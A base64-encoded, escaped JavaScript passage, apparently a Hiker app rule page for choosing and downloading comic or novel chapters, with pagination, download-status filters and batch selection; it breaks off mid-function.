c2lnbih7XFxuICAgIHJ1bGVOYW1lOiBcXFwiXFxcIixcXG4gICAgYm9va05hbWU6IFxcXCJcXFwiLFxcbiAgICBib29rVG9wUGljOiBcXFwiXFxcIixcXG4gICAgcGFyc2VDb2RlOiBcXFwiXFxcIixcXG4gICAgZGVjb2RlOiB1bmRlZmluZWQsXFxuICAgIHR5cGU6IFxcXCJjb21pY1xcXCIsXFxuICAgIGNvbWljU2NoZW1lOiBcXFwiMVxcXCIsXFxuICAgIGJvb2tJZDpcXFwiXFxcIixcXG59LCB2aWV3Q29uZmlnLmluZm8pO1xcbmxldCB7XFxuICAgIGNoYXB0ZXJMaXN0LFxcbiAgICBpbmZvLFxcbiAgICBkZWZhdWx0Vmlld1xcbn0gPSB2aWV3Q29uZmlnO1xcbnNldFBhZ2VUaXRsZShcXFwi6YCJ5oup5ZmofFxcXCIgKyBpbmZvLmJvb2tOYW1lKVxcblxcbmNvbnN0IEZpbGUgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9GaWxlLmpzXFxcIik7XFxuY29uc3QgVG9vbCA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL1Rvb2wuanNcXFwiKTtcXG5jb25zdCBDb25maWcgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9Db25maWcuanNcXFwiKTtcXG5cXG52aWV3Q29uZmlnLmluZm8uYm9va05hbWUgPSBUb29sLnRleHRTaGllbGQodmlld0NvbmZpZy5pbmZvLmJvb2tOYW1lKTtcXG52aWV3Q29uZmlnLmluZm8ucnVsZU5hbWUgPSBUb29sLnRleHRTaGllbGQodmlld0NvbmZpZy5pbmZvLnJ1bGVOYW1lKTtcXG5cXG5jb25zdCBNWV9JRCA9IGluZm8ucnVsZU5hbWUgKyBcXFwiLy9cXFwiICsgaW5mby5ib29rTmFtZStcXFwiLy9cXFwiK2luZm8uYm9va0lkO1xcbmxldCBib2lkPWluZm8uYm9va0lkP1xcXCIkXFxcIitpbmZvLmJvb2tJZDpcXFwiXFxcIjtcXG5jb25zdCBjcGF0aD1cXFwiL1xcXCIgKyBpbmZvLnJ1bGVOYW1lICsgXFxcIi9cXFwiICsgaW5mby5ib29rTmFtZStib2lkO1xcbmxldCBpc1N0YXJ0ID0gZ2V0TXlWYXIoTVlfSUQgKyBcXFwiOmlzU3RhcnRcXFwiKTtcXG5sZXQgdmlld01vZGUgPSBnZXRNeVZhcihNWV9JRCArIFxcXCI6dmlld01vZGVcXFwiLCBkZWZhdWx0Vmlldyk7XFxubGV0IGlzUmV2ZXJzZSA9IGdldE15VmFyKE1ZX0lEICsgXFxcIjppc1JldmVyc2VcXFwiLCBcXFwiMFxcXCIpO1xcbmxldCB0YWdGaWx0ZXIgPSBnZXRNeVZhcihNWV9JRCArIFxcXCI6dGFnRmlsdGVyXFxcIiwgQ29uZmlnLmRlZl9Eb1ZpX1R5cGUpO1xcblxcbmFkZExpc3RlbmVyKFxcXCJvbkNsb3NlXFxcIiwgJC50b1N0cmluZygoTVlfSUQpID0+IHtcXG4gICAgY2xlYXJNeVZhcihNWV9JRCArIFxcXCI6bG9hZGluZ1RlYW1cXFwiKTtcXG4gICAgY2xlYXJNeVZhcihNWV9JRCArIFxcXCI6dmlld01vZGVcXFwiKTtcXG4gICAgY2xlYXJNeVZhcihNWV9JRCArIFxcXCI6Y29tcGxldGVkXFxcIik7XFxuICAgIGNsZWFyTXlWYXIoTVlfSUQgKyBcXFwiOmJhdGNoVGVhbVxcXCIpO1xcbiAgICBjbGVhck15VmFyKE1ZX0lEICsgXFxcIjp0YWdGaWx0ZXJcXFwiKTtcXG4gICAgY2xlYXJNeVZhcihNWV9JRCArIFxcXCI6cGFnZU51bVxcXCIpO1xcbn0sIE1ZX0lEKSk7XFxuXFxubGV0IGxheW91dCA9IFtdO1xcblxcbmlmIChpc1N0YXJ0ID09PSBcXFwiMVxcXCIpIHtcXG4gICAgcHV0TXlWYXIoTVlfSUQgKyBcXFwiOnZpZXdNb2RlXFxcIiwgZGVmYXVsdFZpZXcpO1xcbiAgICB2aWV3TW9kZSA9IFxcXCIxXFxcIjtcXG59XFxuXFxubGV0IGJhY2t1cENoYXB0ZXJMaXN0ID0gY2hhcHRlckxpc3Q7XFxuaWYgKHR5cGVvZiBjaGFwdGVyTGlzdCA9PT0gXFxcInN0cmluZ1xcXCIpIHtcXG4gICAgaWYgKGNoYXB0ZXJMaXN0LnN0YXJ0c1dpdGgoXFxcImhpa2VyOi8vZmlsZXMvXFxcIikpIHtcXG4gICAgICAgIGNoYXB0ZXJMaXN0ID0gZ2V0UGF0aChjaGFwdGVyTGlzdCkuc2xpY2UoNyk7XFxuICAgICAgICBiYWNrdXBDaGFwdGVyTGlzdCA9IGNoYXB0ZXJMaXN0O1xcbiAgICB9XFxuICAgIGNoYXB0ZXJMaXN0ID0gSlNPTi5wYXJzZShyZXF1ZXN0KFxcXCJmaWxlOi8vXFxcIiArIGNoYXB0ZXJMaXN0KSB8fCBcXFwiW11cXFwiKTtcXG59XFxubGV0IGNoYXB0ZXJBbGwgPSBjaGFwdGVyTGlzdDtcXG5jaGFwdGVyTGlzdCA9IGNoYXB0ZXJMaXN0Lm1hcCgoaXRlbSwgQ0lEKSA9PiB7XFxuICAgIGl0ZW0uQ0lEID0gQ0lEO1xcbiAgICBpdGVtLnRpdGxlID0gVG9vbC50ZXh0U2hpZWxkKGl0ZW0udGl0bGUpO1xcbiAgICByZXR1cm4gaXRlbTtcXG59KTtcXG5sZXQgcGFnZU51bSA9IE51bWJlcihnZXRNeVZhcihNWV9JRCArIFxcXCI6cGFnZU51bVxcXCIsIFxcXCIxXFxcIikpO1xcbmxldCBjaGFwdGVyQ2h1bmsgPSBbY2hhcHRlckxpc3RdLmNvbmNhdChUb29sLmNodW5rKGNoYXB0ZXJMaXN0LCBDb25maWcudmlld1BhZ2VTaXplKSk7XFxuY2hhcHRlckxpc3QgPSBjaGFwdGVyQ2h1bmtbcGFnZU51bV0gfHwgW107XFxuY29uc3QgZGVmX0RvVmlfU3R5bGUgPSBjaGFwdGVyQWxsLmxlbmd0aCA9PT0gMSA/IFxcXCJ0ZXh0X2NlbnRlcl8xXFxcIiA6IENvbmZpZy5kZWZfRG9WaV9TdHlsZTtcXG5cXG5mdW5jdGlvbiBzZXRUeXBlKCkge1xcbiAgICBsZXQgc2V0ID0gKHRhZywgcHV0KSA9PiB7XFxuICAgICAgICBwdXRNeVZhcihwdXQsIHRhZyk7XFxuICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxuICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiXFxuICAgIH07XFxuICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiAwID09IHBhZ2VOdW0gPyBcXFwi4oCc4oCc4oCd4oCdXFxcIiArIChcXFwi5YWo6YOoKFxcXCIgKyBjaGFwdGVyQWxsLmxlbmd0aCArIFxcXCIpXFxcIikuZm9udGNvbG9yKFxcXCIjMjNBRDZGXFxcIikgOiBcXFwi5YWo6YOoKFxcXCIgKyBjaGFwdGVyQWxsLmxlbmd0aCArIFxcXCIpXFxcIixcXG4gICAgICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZShzZXQsIDAsIE1ZX0lEICsgXFxcIjpwYWdlTnVtXFxcIiksXFxuICAgICAgICBjb2xfdHlwZTogXFxcInNjcm9sbF9idXR0b25cXFwiXFxuICAgIH0pO1xcbiAgICBmb3IgKGxldCBpID0gMTsgaSA8IGNoYXB0ZXJDaHVuay5sZW5ndGg7IGkrKykge1xcbiAgICAgICAgbGV0IHRhZ1RleHQgPSAoaSAtIDEpICogQ29uZmlnLnZpZXdQYWdlU2l6ZSArIFxcXCItXFxcIiArICgoaSAtIDEpICogQ29uZmlnLnZpZXdQYWdlU2l6ZSArIGNoYXB0ZXJDaHVua1tpXS5sZW5ndGgpO1xcbiAgICAgICAgbGF5b3V0LnB1c2goe1xcbiAgICAgICAgICAgIHRpdGxlOiBpID09IHBhZ2VOdW0gPyBcXFwi4oCc4oCc4oCd4oCdXFxcIiArIHRhZ1RleHQuZm9udGNvbG9yKFxcXCIjMjNBRDZGXFxcIikgOiB0YWdUZXh0LFxcbiAgICAgICAgICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZShzZXQsIGksIE1ZX0lEICsgXFxcIjpwYWdlTnVtXFxcIiksXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJzY3JvbGxfYnV0dG9uXFxcIlxcbiAgICAgICAgfSk7XFxuICAgIH1cXG4gICAgbGF5b3V0LnB1c2goe1xcbiAgICAgICAgY29sX3R5cGU6IFxcXCJibGFua19ibG9ja1xcXCJcXG4gICAgfSk7XFxuICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiB0YWdGaWx0ZXIgPT09IFxcXCIwXFxcIiA/IFxcXCLigJzigJzigJ3igJ1cXFwiICsgXFxcIuWFqOmDqFxcXCIuZm9udGNvbG9yKFxcXCIjMjNBRDZGXFxcIikgOiBcXFwi5YWo6YOoXFxcIixcXG4gICAgICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZShzZXQsIFxcXCIwXFxcIiwgTVlfSUQgKyBcXFwiOnRhZ0ZpbHRlclxcXCIpLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJzY3JvbGxfYnV0dG9uXFxcIlxcbiAgICB9KTtcXG4gICAgbGF5b3V0LnB1c2goe1xcbiAgICAgICAgdGl0bGU6IHRhZ0ZpbHRlciA9PT0gXFxcIjFcXFwiID8gXFxcIuKAnOKAnOKAneKAnVxcXCIgKyBcXFwi5pyq5LiL6L29XFxcIi5mb250Y29sb3IoXFxcIiMyM0FENkZcXFwiKSA6IFxcXCLmnKrkuIvovb1cXFwiLFxcbiAgICAgICAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKHNldCwgXFxcIjFcXFwiLCBNWV9JRCArIFxcXCI6dGFnRmlsdGVyXFxcIiksXFxuICAgICAgICBjb2xfdHlwZTogXFxcInNjcm9sbF9idXR0b25cXFwiXFxuICAgIH0pO1xcbiAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICB0aXRsZTogdGFnRmlsdGVyID09PSBcXFwiMlxcXCIgPyBcXFwi4oCc4oCc4oCd4oCdXFxcIiArIFxcXCLlt7LkuIvovb1cXFwiLmZvbnRjb2xvcihcXFwiIzIzQUQ2RlxcXCIpIDogXFxcIuW3suS4i+i9vVxcXCIsXFxuICAgICAgICB1cmw6ICQoXFxcIiNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoc2V0LCBcXFwiMlxcXCIsIE1ZX0lEICsgXFxcIjp0YWdGaWx0ZXJcXFwiKSxcXG4gICAgICAgIGNvbF90eXBlOiBcXFwic2Nyb2xsX2J1dHRvblxcXCJcXG4gICAgfSk7XFxufVxcbmxldCBjaGFwdGVyVGVhbSA9IFtdO1xcbmxldCByZWNvcmQgPSBbXTtcXG5pZiAoaW5mby50eXBlID09PSBcXFwiY29taWNcXFwiKSB7XFxuICAgIGxldCBsYXp5ID0gJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgoKSA9PiB7XFxuICAgICAgICBjb25zdCBGaWxlID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvRmlsZS5qc1xcXCIpO1xcbiAgICAgICAgbGV0IGZpbGVsaXN0ID0gRmlsZS5nZXRGaWxlUGF0aChpbnB1dCk7XFxuICAgICAgICBsZXQgcGljbGlzdCA9IGZpbGVsaXN0Lm1hcCgoaXRlbSwgaSkgPT4gXFxcImZpbGU6Ly9cXFwiICsgaW5wdXQgKyBcXFwiL1xcXCIgKyAoaSArIDEpICsgXFxcIi5qcGdcXFwiKTtcXG4gICAgICAgIHJldHVybiBcXFwicGljczovL1xcXCIgKyBwaWNsaXN0LmpvaW4oXFxcIiYmXFxcIik7XFxuICAgIH0pO1xcblxcbiAgICBmdW5jdGlvbiBjb21GdW4oaSwgaXRlbSkge1xcbiAgICAgICAgbGV0IHJvb3RQYXRoID0gQ29uZmlnLmNvbWljUGF0aCArIGNwYXRoICsgXFxcIi9cXFwiICsgaSArIFxcXCIkQSRcXFwiICsgaXRlbS50aXRsZTtcXG4gICAgICAgIHJldHVybiB7XFxuICAgICAgICAgICAgdGl0bGU6IFxcXCLigJzigJxcXFwiICsgaXRlbS50aXRsZSArIFxcXCLigJ3igJ1cXFwiLFxcbiAgICAgICAgICAgIHVybDogcm9vdFBhdGggKyBsYXp5LFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgIGlkOiBNWV9JRCArIFxcXCIjXFxcIiArIGksXFxuICAgICAgICAgICAgfSxcXG4gICAgICAgICAgICBjb2xfdHlwZTogZGVmX0RvVmlfU3R5bGVcXG4gICAgICAgIH1cXG4gICAgfVxcbiAgICBGaWxlLmdldEZpbGVQYXRoKENvbmZpZ1tpbmZvLnR5cGUgKyBcXFwiUGF0aFxcXCJdICtjcGF0aCwgXFxcImRpclxcXCIpLmZvckVhY2goKGZpbGUpID0+IHtcXG4gICAgICAgIGxldCBhdHQgPSBUb29sLnNwbGl0KGZpbGUubmFtZSwgXFxcIiRcXFwiLCAyKTtcXG4gICAgICAgIGlmIChhdHQubGVuZ3RoID09PSAzICYmIGF0dFsxXSA9PT0gKFxcXCJBXFxcIikpIHtcXG4gICAgICAgICAgICByZWNvcmQucHVzaChhdHRbMl0pO1xcbiAgICAgICAgfVxcbiAgICB9KTtcXG59IGVsc2Uge1xcbiAgICBmdW5jdGlvbiBjb21GdW4oaSwgaXRlbSkge1xcbiAgICAgICAgcmV0dXJuIHtcXG4gICAgICAgICAgICB0aXRsZTogXFxcIuKAnOKAnFxcXCIgKyBpdGVtLnRpdGxlICsgXFxcIuKAneKAnVxcXCIsXFxuICAgICAgICAgICAgdXJsOiBcXFwiaGlrZXI6Ly9wYWdlL05vdmVsTWFpbkJvZHkjYXV0b1BhZ2UjI3JlYWRUaGVtZSNcXFwiLFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgIGlkOiBNWV9JRCArIFxcXCIjXFxcIiArIGksXFxuICAgICAgICAgICAgICAgIHBhdGg6IENvbmZpZy5ub3ZlbFBhdGggKyBjcGF0aCArIFxcXCIvXFxcIiArIGkgKyBcXFwiJEEkXFxcIiArIGl0ZW0udGl0bGUgKyBcXFwiLnR4dFxcXCIsXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBpdGVtLnRpdGxlXFxuICAgICAgICAgICAgfSxcXG4gICAgICAgICAgICBjb2xfdHlwZTogZGVmX0RvVmlfU3R5bGVcXG4gICAgICAgIH1cXG4gICAgfVxcbiAgICBGaWxlLmdldEZpbGVQYXRoKENvbmZpZ1tpbmZvLnR5cGUgKyBcXFwiUGF0aFxcXCJdICsgY3BhdGgsIFxcXCJmaWxlXFxcIiwgXFxcIi50eHRcXFwiKS5mb3JFYWNoKChmaWxlKSA9PiB7XFxuICAgICAgICBsZXQgYXR0ID0gVG9vbC5zcGxpdChmaWxlLm5hbWUsIFxcXCIkXFxcIiwgMik7XFxuICAgICAgICBpZiAoYXR0Lmxlbmd0aCA9PT0gMyAmJiBhdHRbMV0gPT09IChcXFwiQVxcXCIpKSB7XFxuICAgICAgICAgICAgcmVjb3JkLnB1c2goYXR0WzJdLnNsaWNlKDAsIGF0dFsyXS5sYXN0SW5kZXhPZihcXFwiLlxcXCIpKSk7XFxuICAgICAgICB9XFxuICAgIH0pO1xcbn1cXG5cXG5mdW5jdGlvbiBjbGlja0Rvd25sb2FkKGl0ZW0sIGluZm8sIE1ZX0lELCBpKSB7XFxuICAgIGxldCBsb2FkaW5nVGVhbSA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoTVlfSUQgKyBcXFwiOmxvYWRpbmdUZWFtXFxcIiwgXFxcIltdXFxcIikgfHwgXFxcIltdXFxcIik7XFxuICAgIGxldCBFbGVtZW50SW5kZXggPSBsb2FkaW5nVGVhbS5pbmRleE9mKGkpO1xcbiAgICBpZiAoRWxlbWVudEluZGV4ID4gLTEpIHJldHVybiBcXFwidG9hc3Q6Ly/mraPlnKjkuIvovb1cXFwiO1xcblxcbiAgICBsb2FkaW5nVGVhbS5wdXNoKGkpO1xcbiAgICBwdXRNeVZhcihNWV9JRCArIFxcXCI6bG9hZGluZ1RlYW1cXFwiLCBKU09OLnN0cmluZ2lmeShsb2FkaW5nVGVhbSkpO1xcbiAgICB1cGRhdGVJdGVtKHtcXG4gICAgICAgIHRpdGxlOiBcXFwi4oCY4oCYXFxcIiArIGl0ZW0udGl0bGUgKyBcXFwi4oCZ4oCZXFxcIixcXG4gICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgaWQ6IE1ZX0lEICsgXFxcIiNcXFwiICsgaVxcbiAgICAgICAgfVxcbiAgICB9KTtcXG4gICAgbGV0IHJlc3VsdCA9IFxcXCJ0b2FzdDovL+S4i+i9veWksei0pVxcXCI7XFxuICAgIHRyeSB7XFxuICAgICAgICB0b2FzdChcXFwi5byA5aeL5LiL6L29OlxcXCIgKyBpdGVtLnRpdGxlKTtcXG4gICAgICAgIGxldCBkb3dubG9hZCA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL0Rvd25sb2FkLmV4ZS5qc1xcXCIpO1xcbiAgICAgICAgcmVzdWx0ID0gZG93bmxvYWQoaXRlbSwgaW5mbywgaSwgTVlfSUQpO1xcbiAgICAgICAgdXBkYXRlSXRlbSh7XFxuICAgICAgICAgICAgdGl0bGU6IFxcXCLigJzigJxcXFwiICsgaXRlbS50aXRsZSArIFxcXCLigJ3igJ1cXFwiLFxcbiAgICAgICAgICAgIHVybDogXFxcInRvYXN0Oi8v5bey5LiL6L29XFxcIixcXG4gICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICBpZDogTVlfSUQgKyBcXFwiI1xcXCIgKyBpXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSk7XFxuICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgIHVwZGF0ZUl0ZW0oe1xcbiAgICAgICAgICAgIHRpdGxlOiBpdGVtLnRpdGxlLFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgIGlkOiBNWV9JRCArIFxcXCIjXFxcIiArIGlcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9KTtcXG4gICAgICAgIGxvZyhlLnRvU3RyaW5nKCkpO1xcbiAgICB9IGZpbmFsbHkge1xcbiAgICAgICAgbG9hZGluZ1RlYW0uc3BsaWNlKEVsZW1lbnRJbmRleCwgMSk7XFxuICAgICAgICBwdXRNeVZhcihNWV9JRCArIFxcXCI6bG9hZGluZ1RlYW1cXFwiLCBKU09OLnN0cmluZ2lmeShsb2FkaW5nVGVhbSkpO1xcbiAgICB9XFxuICAgIHJldHVybiByZXN1bHQ7XFxufVxcblxcbmZ1bmN0aW9uIHNpbmdsZVZpZXcoKSB7XFxuICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiBcXFwi5Y+N6L2s5YiX6KGoXFxcIixcXG4gICAgICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgoaXNSZXZlcnNlLCBNWV9JRCkgPT4ge1xcbiAgICAgICAgICAgIHB1dE15VmFyKE1ZX0lEICsgXFxcIjppc1JldmVyc2VcXFwiLCBpc1JldmVyc2UgPT09IFxcXCIwXFxcIiA/IFxcXCIxXFxcIiA6IFxcXCIwXFxcIik7XFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcbiAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCI7XFxuICAgICAgICB9LCBpc1JldmVyc2UsIE1ZX0lEKSxcXG4gICAgICAgIHBpY191cmw6IFxcXCJodHRwczovL2ltZy5pY29uczguY29tLz9pZD0zM252RHFiSEg3SFcmc2l6ZT00OCZmb3JtYXQ9Z2lmJnRva2VuPVxcXCIsXFxuICAgICAgICBjb2xfdHlwZTogXFxcImljb25fMlxcXCJcXG4gICAgfSk7XFxuICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiBcXFwi5om56YeP5LiL6L29XFxcIixcXG4gICAgICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgoTVlfSUQpID0+IHtcXG4gICAgICAgICAgICBsZXQgbG9hZGluZ1RlYW0gPSBKU09OLnBhcnNlKGdldE15VmFyKE1ZX0lEICsgXFxcIjpsb2FkaW5nVGVhbVxcXCIsIFxcXCJbXVxcXCIpIHx8IFxcXCJbXVxcXCIpO1xcbiAgICAgICAgICAgIGlmIChsb2FkaW5nVGVhbS5sZW5ndGggPiAwKSByZXR1cm4gXFxcInRvYXN0Oi8v6L+Y5pyJ5Lu75Yqh5rKh5pyJ5a6M5oiQXFxcIjtcXG4gICAgICAgICAgICBpZiAoZ2V0QXBwVmVyc2lvbigpIDwgMjU5NCkgcmV0dXJuIFxcXCJ0b2FzdDovL+acquW8gOaUvlxcXCI7XFxuICAgICAgICAgICAgcHV0TXlWYXIoTVlfSUQgKyBcXFwiOnZpZXdNb2RlXFxcIiwgXFxcIjFcXFwiKTtcXG4gICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIjtcXG5cXG4gICAgICAgIH0sIE1ZX0lEKSxcXG4gICAgICAgIHBpY191cmw6IFxcXCJodHRwczovL2ltZy5pY29uczguY29tLz9mb3JtYXQ9Z2lmJmlkPTB1YWZhTU56eGo4OCZ0b2tlbj1cXFwiLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJpY29uXzJcXFwiXFxuICAgIH0pO1xcbiAgICBzZXRUeXBlKCk7XFxuICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgIGNvbF90eXBlOiBcXFwibGluZV9ibGFua1xcXCJcXG4gICAgfSk7XFxuICAgIGxldCBsb2FkaW5nVGVhbSA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoTVlfSUQgKyBcXFwiOmxvYWRpbmdUZWFtXFxcIiwgXFxcIltdXFxcIikgfHwgXFxcIltdXFxcIik7XFxuICAgIGZvciAobGV0IGkgPSAwLCBpdGVtID0gY2hhcHRlckxpc3RbMF07IGkgPCBjaGFwdGVyTGlzdC5sZW5ndGg7IGl0ZW0gPSBjaGFwdGVyTGlzdFsrK2ldKSB7XFxuICAgICAgICBsZXQgaXNfZG93bmxvYWQgPSByZWNvcmQuaW5jbHVkZXMoaXRlbS50aXRsZSk7XFxuICAgICAgICBpZiAoaXNfZG93bmxvYWQgJiYgdGFnRmlsdGVyICE9PSBcXFwiMVxcXCIpIHtcXG4gICAgICAgICAgICBjaGFwdGVyVGVhbS5wdXNoKGNvbUZ1bihpdGVtLkNJRCwgaXRlbSkpO1xcbiAgICAgICAgfSBlbHNlIGlmICghaXNfZG93bmxvYWQgJiYgdGFnRmlsdGVyICE9PSBcXFwiMlxcXCIpIHtcXG4gICAgICAgICAgICBjaGFwdGVyVGVhbS5wdXNoKHtcXG4gICAgICAgICAgICAgICAgdGl0bGU6IGxvYWRpbmdUZWFtLmluY2x1ZGVzKGl0ZW0uQ0lEKSA/IFxcXCLigJjigJhcXFwiICsgaXRlbS50aXRsZSArIFxcXCLigJnigJlcXFwiIDogaXRlbS50aXRsZSxcXG4gICAgICAgICAgICAgICAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKGNsaWNrRG93bmxvYWQsIGl0ZW0sIGluZm8sIE1ZX0lELCBpdGVtLkNJRCksXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgICAgICBpZDogTVlfSUQgKyBcXFwiI1xcXCIgKyBpdGVtLkNJRFxcbiAgICAgICAgICAgICAgICB9LFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogZGVmX0RvVmlfU3R5bGVcXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgIH1cXG4gICAgfVxcbn1cXG5cXG5mdW5jdGlvbiBjbGlja0Nob29zZSh0aXRsZSwgTVlfSUQsIGkpIHtcXG4gICAgbGV0IGlzU3RhcnQgPSBnZXRNeVZhcihNWV9JRCArIFxcXCI6aXNTdGFydFxcXCIpO1xcbiAgICBpZiAoaXNTdGFydCA9PT0gXFxcIjFcXFwiKSByZXR1cm4gXFxcInRvYXN0Oi8v5q2j5Zyo5LiL6L29Li4uXFxcIjtcXG4gICAgbGV0IGJhdGNoVGVhbSA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoTVlfSUQgKyBcXFwiOmJhdGNoVGVhbVxcXCIsIFxcXCJbXVxcXCIpIHx8IFxcXCJbXVxcXCIpO1xcbiAgICBsZXQgRWxlbWVudEluZGV4ID0gYmF0Y2hUZWFtLmluZGV4T2YoaSk7XFxuICAgIGlmIChFbGVtZW50SW5kZXggPiAtMSkge1xcbiAgICAgICAgdXBkYXRlSXRlbSh7XFxuICAgICAgICAgICAgdGl0bGU6IHRpdGxlLFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgIGlkOiBNWV9JRCArIFxcXCIjXFxcIiArIGlcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9KTtcXG4gICAgICAgIGJhdGNoVGVhbS5zcGxpY2UoRWxlbWVudEluZGV4LCAxKTtcXG4gICAgfSBlbHNlIHtcXG4gICAgICAgIHVwZGF0ZUl0ZW0oe1xcbiAgICAgICAgICAgIHRpdGxlOiBcXFwi4oCY4oCYXFxcIiArIHRpdGxlICsgXFxcIuKAmeKAmVxcXCIsXFxuICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgaWQ6IE1ZX0lEICsgXFxcIiNcXFwiICsgaVxcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH0pO1xcbiAgICAgICAgYmF0Y2hUZWFtLnB1c2goaSk7XFxuICAgIH1cXG4gICAgcHV0TXlWYXIoTVlfSUQgKyBcXFwiOmJhdGNoVGVhbVxcXCIsIEpTT04uc3RyaW5naWZ5KGJhdGNoVGVhbSkpO1xcbiAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiO1xcbn1cXG5cXG5mdW5jdGlvbiBiYXRjaFZpZXcoKSB7XFxuICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiBcXFwi5Y2V6YCJ5LiL6L29XFxcIixcXG4gICAgICAgIHBpY191cmw6IFxcXCJodHRwczovL2ltZy5pY29uczguY29tLz9pZD1QSWljdkY2ZWJ6TW4mc2l6ZT00OCZmb3JtYXQ9Z2lmJnRva2VuPVxcXCIsXFxuICAgICAgICB1cmw6ICQoXFxcIiNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoKE1ZX0lEKSA9PiB7XFxuICAgICAgICAgICAgaWYgKGdldE15VmFyKE1ZX0lEICsgXFxcIjppc1N0YXJ0XFxcIikgPT09IFxcXCIxXFxcIikgcmV0dXJuIFxcXCJ0b2FzdDovL+ato+WcqOaJuemHj+S4i+i9vVxcXCI7XFxuICAgICAgICAgICAgcHV0TXlWYXIoTVlfSUQgKyBcXFwiOnZpZXdNb2RlXFxcIiwgXFxcIjBcXFwiKTtcXG4gICAgICAgICAgICBjbGVhck15VmFyKE1ZX0lEICsgXFxcIjpiYXRjaFRlYW1cXFwiKTtcXG4gICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIjtcXG4gICAgICAgIH0sIE1ZX0lEKSxcXG4gICAgICAgIGNvbF90eXBlOiBcXFwiaWNvbl9zbWFsbF80XFxcIlxcbiAgICB9KTtcXG4gICAgbGV0IHN0YXJ0ID0gQ29uZmlnLnZpZXdQYWdlU2l6ZSAqIE1hdGgubWF4KHBhZ2VOdW0gLSAxLCAwKTtcXG4gICAgbGV0IGVuZCA9IHN0YXJ0ICsgY2hhcHRlckxpc3QubGVuZ3RoO1xcbiAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICB0aXRsZTogXFxcIumAieaLqeWFqOmDqFxcXCIsXFxuICAgICAgICBwaWNfdXJsOiBcXFwiaHR0cHM6Ly9pbWcuaWNvbnM4LmNvbS8/Zm9ybWF0PWdpZiZpZD0xSFZjSExvTnpyaXQmdG9rZW49XFxcIixcXG4gICAgICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgoc3RhcnQsIGVuZCwgTVlfSUQpID0+IHtcXG4gICAgICAgICAgICBpZiAoZ2V0TXlWYXIoTVlfSUQgKyBcXFwiOmlzU3RhcnRcXFwiKSA9PT0gXFxcIjFcXFwiKSByZXR1cm4gXFxcInRvYXN0Oi8v5q2j5Zyo5LiL6L295ZOmflxcXCI7XFxuICAgICAgICAgICAgY29uc3QgVG9vbCA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL1Rvb2wuanNcXFwiKTtcXG4gICAgICAgICAgICBsZXQgY2hvb3NlVGVhbSA9IFRvb2wucmFuZ2Uoc3RhcnQsIGVuZCk7XFxuICAgICAgICAgICAgbGV0IGJhdGNoVGVhbSA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoTVlfSUQgKyBcXFwiOmJhdGNoVGVhbVxcXC